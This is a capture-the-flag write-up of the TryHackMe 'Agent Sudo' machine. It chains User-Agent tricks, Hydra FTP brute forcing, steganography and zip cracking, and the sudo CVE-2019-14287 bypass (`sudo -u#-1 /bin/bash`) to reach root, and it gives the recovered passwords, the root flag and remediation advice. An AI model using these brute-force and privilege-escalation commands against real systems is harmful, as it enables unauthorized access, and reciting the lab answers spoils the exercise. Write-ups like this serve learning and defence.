# Agent Sudo — TryHackMe — Easy — Steganography

**Date Completed:** 26 Sep 2026
**Time to Root:** ~2 hours
**User Flag:** `james (SSH access via credentials hidden in JPG steganography)`
**Root Flag:** `b53a02f55b57d4439e3341834d70c062`

---

## Executive Summary

Agent Sudo is the most varied machine in this portfolio, chaining together five distinct techniques: HTTP User-Agent manipulation to access a hidden page, FTP brute forcing, PNG steganography combined with zip password cracking, JPG steganography to recover SSH credentials, and finally a sudo privilege escalation CVE (CVE-2019-14287) to obtain root. Each stage yields the clue needed for the next, simulating a realistic multi-layered social-engineering-style CTF narrative.

---

## Scope and Methodology

- **Target IP:** 10.82.140.36
- **Platform:** TryHackMe
- **Category:** Steganography
- **Methodology:** Reconnaissance — Enumeration — Exploitation — Privilege Escalation

---

## Reconnaissance

### Port Scan

```bash
sudo nmap -sV -sC -T4 10.82.140.36
```

| Port | Service | Version | Notes |
|------|---------|---------|-------|
| 21 | FTP | vsftpd 3.0.3 | Brute-forced with Hydra |
| 22 | SSH | OpenSSH | Used post-steganography with recovered credentials |
| 80 | HTTP | Apache 2.4.29 (Ubuntu) | Entry point — User-Agent gated content |

---

## Enumeration

The homepage displayed a message from "Agent R" instructing visitors to set their HTTP User-Agent header to their own "codename" to access hidden content.

Testing individual letters via curl revealed that `R` triggered a suspicious warning response, while other values returned the generic page — indicating the server was actively checking the User-Agent header against known values.

Following redirects (`-L`) with the codename `C` revealed a hidden message:
```bash
curl -A "C" -L http://10.82.140.36
```
This returned a message addressed to a user named **chris**, referencing a weak password and another agent ("Agent J").

---

## Exploitation

### Stage 1 — FTP Brute Force

**Vulnerability Class:** Weak Credentials (CWE-521)

With the username `chris` confirmed, brute-forced the FTP service:
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.82.140.36
```
Result: `chris:crystal`

Logged in via FTP and retrieved three files:
```bash
ftp 10.82.140.36
get cute-alien.jpg
get cutie.png
get To_agentJ.txt
```

`To_agentJ.txt` revealed that the images were decoys, but one contained a real hidden password via steganography.

### Stage 2 — PNG Steganography + Zip Cracking

Ran binwalk against `cutie.png` to check for embedded file signatures:
```bash
binwalk cutie.png
```
This revealed an encrypted zip archive embedded inside the PNG, containing `To_agentR.txt`.

Extracted it and cracked the zip password:
```bash
binwalk --extract cutie.png
cd _cutie.png.extracted/
zip2john 8702.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
```
Cracked password: **`alien`**

Extracted the archive (using `7z` due to a zip version incompatibility with standard `unzip`):
```bash
7z x 8702.zip
cat To_agentR.txt
```

The file contained a Base64-encoded string: `QXJlYTUx`. Decoded:
```bash
echo "QXJlYTUx" | base64 -d
```
Result: **`Area51`**

### Stage 3 — JPG Steganography

**Vulnerability Class:** Sensitive Data Exposure via Steganography (CWE-200)

Used the decoded string as the steghide passphrase against the second image:
```bash
steghide extract -sf cute-alien.jpg
# Passphrase: Area51
cat message.txt
```

This revealed a new set of SSH credentials:
- **Username:** `james`
- **Password:** `hackerrules!`

---

## Privilege Escalation

**Vulnerability Class:** Sudo Sign-Extension Privilege Escalation — CVE-2019-14287

Logged in via SSH as `james` and checked sudo permissions:
```bash
ssh james@10.82.140.36
sudo -l
```

Result:

User james may run the following commands on agent-sudo:
(ALL, !root) /bin/bash


This configuration attempts to allow `james` to run `/bin/bash` as any user *except* root. Checked the sudo version:
```bash
sudo -V
```
Result: **Sudo version 1.8.21p2** — vulnerable, as this issue was only patched in 1.8.28.

CVE-2019-14287 exists because sudo's user-ID handling incorrectly converts a specified UID of `-1` (or `4294967295`, its unsigned equivalent) into `0` — root's UID — due to a sign-comparison flaw, bypassing the explicit `!root` exclusion entirely:

```bash
sudo -u#-1 /bin/bash
```

This dropped directly into a root shell.

---

## Proof of Completion

b53a02f55b57d4439e3341834d70c062


---

## Vulnerability Analysis

| Finding | Severity | CVSS | MITRE ATT&CK | CWE |
|---------|----------|------|--------------|-----|
| Weak FTP password (brute-forceable) | Medium | 5.9 | T1110.001 | CWE-521 |
| Sensitive credentials hidden via steganography (found regardless) | Low | 3.7 | T1027 | CWE-200 |
| Sudo CVE-2019-14287 (UID -1 sign-extension bypass) | Critical | 8.8 | T1548.003 | CWE-269 |

---

## Remediation

1. **Weak FTP Credentials:** Enforce strong password policies and rate-limit or lock out accounts after repeated failed authentication attempts to slow brute-force attacks.
2. **Steganography as "Security":** Hiding credentials inside image files is not a substitute for proper secrets management. Credentials should never be embedded in files of any kind, obfuscated or not — use a proper secrets manager or vault.
3. **Sudo CVE-2019-14287:** Upgrade sudo to version 1.8.28 or later. Additionally, avoid relying on user/group exclusion syntax (`!root`) in sudoers rules as a security boundary — prefer strict allow-listing of exactly what is needed rather than "everything except X."

---

## Tools Used

| Tool | Purpose |
|------|---------|
| Nmap | Port scanning and service detection |
| curl | HTTP User-Agent manipulation and redirect following |
| Hydra | FTP credential brute forcing |
| Binwalk | Detecting and extracting embedded file signatures in the PNG |
| zip2john / John the Ripper | Cracking the embedded zip archive's password |
| 7-Zip | Extracting the zip archive (unzip compatibility workaround) |
| Steghide | Extracting hidden data from the JPG |
| OpenSSH | Authenticated access and privilege escalation |

---

## Lessons Learned

- This machine is a good example of a multi-stage "breadcrumb" CTF design, where each artifact (a text file, an image, a decoded string) exists purely to unlock the next stage rather than being independently exploitable.
- `unzip` doesn't support every zip compression/version combination — `7z` is a reliable fallback when `unzip` reports a "need PK compat" version error.
- CVE-2019-14287 is a great real-world lesson in why sudoers exclusion syntax (`!root`) is fragile: it relies on sudo correctly identifying "root" by UID comparison, and a single sign-handling bug in that comparison logic was enough to defeat the entire restriction.

